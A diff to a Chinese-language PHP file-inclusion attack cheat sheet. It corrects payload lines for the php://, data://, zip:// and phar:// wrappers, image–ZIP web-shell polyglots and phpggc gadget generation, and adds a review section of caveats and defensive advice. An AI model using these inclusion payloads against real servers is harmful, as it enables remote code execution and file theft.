@@ -43,7 +43,7 @@ _platform: linux_
 ```
 php://filter/convert.base64-encode/resource=config.php
 php://input (POST数据作为输入)
-php://data://text/plain,<?php phpinfo();?>
+data://text/plain,<?php phpinfo();?>
 phar://archive.zip/shell.php
 ```
 **语法解析：**
@@ -983,7 +983,7 @@ with zipfile.ZipFile('shell.zip', 'w') as z:
 copy image.jpg+shell.zip image.jpg
 
 # 或使用
-cat image.jpg shell.zip > image.jpg
+cat image.jpg shell.zip > image-polyglot.jpg
 
 # 包含
 ?file=zip://uploads/image.jpg%23shell.txt&c=id
@@ -1012,7 +1012,7 @@ zip inner.zip shell.txt
 zip outer.zip inner.zip
 
 # 包含
-?file=zip://outer.zip%23inner.zip%23shell.txt&c=id
+[无通用递归语义：zip:// 不会自动把内层 ZIP 再作为归档解析]
 ```
 **语法解析：**
 - `#` — 命令/载荷起始 _command_
@@ -1021,7 +1021,7 @@ zip inner.zip shell.txt
 zip outer.zip inner.zip
 
 # 包含
-?file=zip://outer.zip%23inner.zip%23shell.txt&c=id` — 参数与载荷内容 _value_
+[无通用递归语义：zip:// 不会自动把内层 ZIP 再作为归档解析]` — 参数与载荷内容 _value_
 
 
 **概述：** zip://伪协议可从ZIP压缩包中读取并包含指定文件，攻击者上传包含恶意PHP代码的ZIP文件(可伪装为图片等)，然后通过LFI的zip://协议包含其中的PHP文件实现代码执行。
@@ -1117,7 +1117,7 @@ cp exploit.phar exploit.gif
 
 # 使用phpggc生成
 git clone https://github.com/ambionics/phpggc
-php phpggc Laravel/RCE1 system id > exploit.phar
+# phpggc 默认输出序列化数据，不是 Phar 归档；先核对当前版本的归档生成功能及实验夹具。
 ```
 
 **WAF/EDR 绕过变体：**
@@ -1363,3 +1363,14 @@ _platform: linux_
 4. 使用chroot隔离
 
 ---
+
+
+## 复核后的适用边界
+
+- `include` / `require` 可以解释 PHP；`fopen` 等读取操作不自动等于代码执行。优先使用固定标识符到文件的允许列表；仅 `basename` 或去掉 `../` 不能证明目录隔离，路径规范化后还须检查目录分隔符边界、符号链接与竞态。
+- `%00`、过长路径截断、非规范 UTF-8（如 `%c0%af`）是历史或特定解析器行为，不是现代 PHP 的通用绕过。`string.strip_tags` 过滤器已弃用，不能作为安全边界。
+- `data://` / `php://input` 的包含依赖 PHP 配置、SAPI 与实际包含操作；过滤器链也依赖底层流，不能把任意编码链视为已验证的执行链。
+- 图片与 ZIP 拼接只生成候选文件，不保证图片和归档解析器都接受；输出应使用新文件，不能覆盖输入。改扩展名不会添加 GIF 文件头。`zip://` 的两个 `#` 不代表递归解包。
+- PHP 8 起 Phar 元数据不再由普通文件系统操作自动反序列化；旧版本的链仍需可达的 gadget。显式读取元数据的 API 需单独审查。构造器/析构器样例也可能在生成端执行，禁止为静态审查运行。
+- `/proc/self/environ` 不保证包含 HTTP 头，取决于部署方式；未知文件描述符可能阻塞或泄露敏感数据。会话路径、序列化格式与内容取决于处理器，设置会话 ID 不等于控制会话内容。
+- 记录中的 shell/PHP 混合片段有引号和变量展开前提，应作为协议级示意阅读；不直接复制执行。只用批准的本地合成标记文件验证，避免读取真实凭据或植入 web shell。本次未执行任何载荷。
